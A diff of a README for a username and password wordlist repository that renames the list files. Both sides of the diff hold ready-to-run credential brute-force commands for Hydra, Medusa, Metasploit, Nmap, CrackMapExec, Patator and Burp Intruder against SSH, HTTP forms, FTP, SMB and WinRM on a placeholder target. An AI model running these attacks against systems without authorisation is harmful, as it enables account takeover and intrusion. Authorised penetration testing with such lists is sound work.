@@ -24,8 +24,8 @@ This repository contains carefully curated wordlists that combine commonly used 
 
 ## 📦 Contents
 
-- `username.txt` - 81 common usernames and their variations
-- `passwords.txt` - 40,965 merged and deduplicated passwords
+- `daa_users.lst` - 81 common usernames and their variations
+- `daa_pass.lst` - 40,965 merged and deduplicated passwords
 
 ## 👤 Username List
 
@@ -83,26 +83,26 @@ All duplicate entries have been removed to create an optimized, high-quality wor
 
 ### Hydra (SSH Brute Force)
 ```bash
-hydra -L username.txt -P passwords.txt ssh://target-ip -t 4
+hydra -L daa_users.lst -P daa_pass.lst ssh://target-ip -t 4
 ```
 
 ### Hydra (HTTP Form)
 ```bash
-hydra -L username.txt -P passwords.txt target-ip http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
+hydra -L daa_users.lst -P daa_pass.lst target-ip http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
 ```
 
 ### Medusa (Multiple Services)
 ```bash
-medusa -h target-ip -U username.txt -P passwords.txt -M ssh -t 4
-medusa -h target-ip -U username.txt -P passwords.txt -M ftp
+medusa -h target-ip -U daa_users.lst -P daa_pass.lst -M ssh -t 4
+medusa -h target-ip -U daa_users.lst -P daa_pass.lst -M ftp
 ```
 
 ### Metasploit
 ```ruby
 use auxiliary/scanner/ssh/ssh_login
 set RHOSTS target-ip
-set USER_FILE username.txt
-set PASS_FILE passwords.txt
+set USER_FILE daa_users.lst
+set PASS_FILE daa_pass.lst
 set THREADS 10
 run
 ```
@@ -110,32 +110,32 @@ run
 ### Nmap NSE Scripts
 ```bash
 # SSH brute force
-nmap --script ssh-brute --script-args userdb=username.txt,passdb=passwords.txt -p 22 target-ip
+nmap --script ssh-brute --script-args userdb=daa_users.lst,passdb=daa_pass.lst -p 22 target-ip
 
 # HTTP brute force
-nmap --script http-brute --script-args userdb=username.txt,passdb=passwords.txt target-ip
+nmap --script http-brute --script-args userdb=daa_users.lst,passdb=daa_pass.lst target-ip
 ```
 
 ### CrackMapExec
 ```bash
 # SMB
-crackmapexec smb target-ip -u username.txt -p passwords.txt
+crackmapexec smb target-ip -u daa_users.lst -p daa_pass.lst
 
 # SSH
-crackmapexec ssh target-ip -u username.txt -p passwords.txt --threads 10
+crackmapexec ssh target-ip -u daa_users.lst -p daa_pass.lst --threads 10
 
 # WinRM
-crackmapexec winrm target-ip -u username.txt -p passwords.txt
+crackmapexec winrm target-ip -u daa_users.lst -p daa_pass.lst
 ```
 
 ### Patator
 ```bash
-patator ssh_login host=target-ip user=FILE0 password=FILE1 0=username.txt 1=passwords.txt -x ignore:mesg='Authentication failed'
+patator ssh_login host=target-ip user=FILE0 password=FILE1 0=daa_users.lst 1=daa_pass.lst -x ignore:mesg='Authentication failed'
 ```
 
 ### Burp Suite Intruder
-1. Load `username.txt` as payload list 1
-2. Load `passwords.txt` as payload list 2
+1. Load `daa_users.lst` as payload list 1
+2. Load `daa_pass.lst` as payload list 2
 3. Set attack type to "Cluster bomb" or "Pitchfork"
 4. Configure grep match for successful authentication
 
